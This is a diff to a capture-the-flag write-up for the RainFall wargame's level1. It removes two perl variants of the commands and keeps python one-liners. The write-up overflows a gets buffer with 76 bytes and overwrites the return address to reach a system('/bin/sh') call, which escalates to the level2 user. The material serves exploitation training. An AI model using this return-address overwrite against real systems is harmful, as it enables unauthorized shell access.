@@ -40,7 +40,6 @@ We can see here the binary calls the C function ```gets```, which copies a strin
 Let's see if we can cause a buffer overflow. A buffer overflow allows us to change the flow of execution of the program.
 ```
 level1@RainFall:~$ python -c 'print "a"*76' | ./level1
-level1@RainFall:~$ perl -E "print '*' x 76" | ./level1
 Illegal instruction (core dumped)
 ```
 So we've effectively triggered a stack overflow here.
@@ -61,7 +60,6 @@ If we run system("/bin/sh"), [it will launch a shell](https://stackoverflow.com/
 
 ```
 level1@RainFall:~$ (python -c 'print "a"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
-level1@RainFall:~$ (perl -e 'print "a" x 76 . "\x44\x84\x04\x08"' ; cat -) | ./level1
 Good... Wait what?
 whoami
 level2
